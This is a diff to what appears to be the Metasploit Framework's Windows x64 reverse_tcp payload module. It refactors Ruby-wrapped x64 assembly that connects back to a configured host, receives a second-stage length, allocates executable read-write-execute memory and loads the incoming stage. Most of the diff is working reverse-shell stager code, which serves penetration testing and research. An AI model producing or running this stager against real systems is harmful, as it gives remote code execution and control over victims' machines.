@@ -10,7 +10,7 @@ module Msf
 
 ###
 #
-# Complex reverse_tcp payload generation for Windows ARCH_X86_64
+# Complex reverse_tcp payload generation for Windows ARCH_X64
 #
 ###
 
@@ -41,7 +41,7 @@ module Payload::Windows::ReverseTcp_x64
     }
 
     # Generate the advanced stager if we have space
-    unless self.available_space.nil? || required_space > self.available_space
+    if self.available_space && required_space <= self.available_space
       conf[:exitfunk] = datastore['EXITFUNC']
       conf[:reliable] = true
     end
@@ -63,12 +63,13 @@ module Payload::Windows::ReverseTcp_x64
   def generate_reverse_tcp(opts={})
     combined_asm = %Q^
       cld                     ; Clear the direction flag.
-      and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned 
+      and rsp, ~0xF           ;  Ensure RSP is 16 byte aligned
       call start              ; Call start, this pushes the address of 'api_call' onto the stack.
       #{asm_block_api}
       start:
         pop rbp               ; block API pointer
       #{asm_reverse_tcp(opts)}
+      #{asm_block_recv(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
   end
@@ -99,13 +100,12 @@ module Payload::Windows::ReverseTcp_x64
   #
   # Generate an assembly stub with the configured feature set and options.
   #
-  # @option opts [Fixnum] :port The port to connect to
+  # @option opts [Integer] :port The port to connect to
   # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
   # @option opts [Bool] :reliable Whether or not to enable error handling code
   #
   def asm_reverse_tcp(opts={})
 
-    reliable     = opts[:reliable]
     retry_count  = [opts[:retry_count].to_i, 1].max
     encoded_port = [opts[:port].to_i,2].pack("vn").unpack("N").first
     encoded_host = Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
@@ -191,14 +191,22 @@ module Payload::Windows::ReverseTcp_x64
     ^
     asm << asm_send_uuid if include_send_uuid
 
-    asm << %Q^
+    asm
+
+  end
+
+  def asm_block_recv(opts={})
+
+    reliable     = opts[:reliable]
+
+    asm = %Q^
       recv:
       ; Receive the size of the incoming second stage...
         sub rsp, 16             ; alloc some space (16 bytes) on stack for to hold the
                                 ; second stage length
         mov rdx, rsp            ; set pointer to this buffer
         xor r9, r9              ; flags
-        push 4                  ; 
+        push 4                  ;
         pop r8                  ; length = sizeof( DWORD );
         mov rcx, rdi            ; the saved socket
         mov r10d, #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
@@ -220,9 +228,9 @@ module Payload::Windows::ReverseTcp_x64
       ; Alloc a RWX buffer for the second stage
         pop rsi                 ; pop off the second stage length
         mov esi, esi            ; only use the lower-order 32 bits for the size
-        push 0x40               ; 
+        push 0x40               ;
         pop r9                  ; PAGE_EXECUTE_READWRITE
-        push 0x1000             ; 
+        push 0x1000             ;
         pop r8                  ; MEM_COMMIT
         mov rdx, rsi            ; the newly recieved second stage length.
         xor rcx, rcx            ; NULL as we dont care where the allocation is.
